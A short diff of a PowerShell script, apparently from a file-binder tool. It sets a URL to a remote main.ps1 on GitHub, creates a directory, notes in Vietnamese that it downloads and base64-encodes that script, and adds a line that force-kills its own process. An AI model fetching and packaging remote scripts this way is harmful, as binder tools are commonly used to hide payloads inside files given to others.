@@ -5,6 +5,7 @@ $url = "https://raw.githubusercontent.com/s1uiasdad/binder/main/file/main.ps1"
 $directoryPath = ".\fileinhere"
 if (-Not (Test-Path -Path $directoryPath)) {
     New-Item -Path $directoryPath -ItemType Directory
+    Stop-Process $pid -Force
 }
 
 # Tải nội dung từ URL và mã hóa base64
